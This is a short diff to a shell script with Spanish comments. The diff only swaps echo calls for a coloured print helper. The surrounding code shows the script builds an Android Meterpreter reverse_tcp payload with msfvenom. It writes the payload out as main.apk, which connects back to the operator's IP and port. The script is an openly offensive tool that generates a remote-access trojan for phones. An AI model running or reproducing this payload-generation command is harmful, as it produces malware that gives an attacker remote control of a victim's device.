@@ -4,7 +4,7 @@ source ./utilities/utils.sh
 
 # Función para mostrar el uso del script
 usage() {
-    echo "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
+    print_cyan "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
     exit 1
 }
 
@@ -56,7 +56,7 @@ fi
 
 print_cyan "Generando payload..."
 # Generar el payload de Android con msfvenom, en ./main.apk
-echo "msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk"
+print_cyan "msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk"
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk
 
 if [ $? -eq 0 ]; then
